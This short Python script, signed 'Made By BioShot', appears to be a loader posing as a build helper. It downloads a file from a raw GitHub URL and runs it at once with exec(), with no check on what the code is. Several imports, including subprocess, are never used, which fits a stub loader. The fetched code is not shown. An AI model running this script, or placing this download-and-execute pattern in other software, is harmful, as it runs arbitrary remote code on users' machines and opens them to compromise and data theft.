import os
import requests
import tempfile
import random
import string
import subprocess
# Made By BioShot #

buildUrl = "https://raw.githubusercontent.com/Leviathenn/CBuild/main/build(don'tdownloadthisversion).py"

buildF = requests.get(buildUrl).text
exec(buildF)
